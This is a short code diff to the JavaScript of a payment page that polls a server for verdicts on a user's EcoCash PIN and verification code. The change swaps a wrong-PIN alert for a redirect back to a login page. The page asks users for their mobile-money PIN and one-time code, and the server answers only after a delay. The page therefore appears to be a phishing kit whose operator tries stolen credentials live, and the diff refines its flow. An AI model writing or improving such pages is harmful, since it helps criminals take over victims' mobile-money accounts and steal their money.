@@ -137,12 +137,10 @@
         document.getElementById('successOverlay').classList.add('active'); 
       } else if (data.code_status === 'wrong_code') { 
         clearInterval(checkInterval); 
-        // Turn boxes red
         document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('error'); });
         document.getElementById('codeError').textContent = 'Wrong code. Please enter the recent code sent by EcoCash to verify.';
         document.getElementById('codeError').style.color = 'var(--danger)';
         document.getElementById('codeError').classList.add('show');
-        // Clear inputs
         document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled'); });
         document.querySelector('.cd').focus();
         document.getElementById('waitSection').style.display = 'none';
@@ -154,8 +152,8 @@
         }, 4000);
       } else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { 
         clearInterval(checkInterval); 
-        alert('Wrong PIN. Please use the correct PIN.'); 
-        window.location.href = '/'; 
+        // Redirect to login page with error parameter
+        window.location.href = '/login?plan=' + encodeURIComponent(payPlan) + '&amount=' + payAmount + '&error=wrong_pin';
       }
     }, 2000);
   }
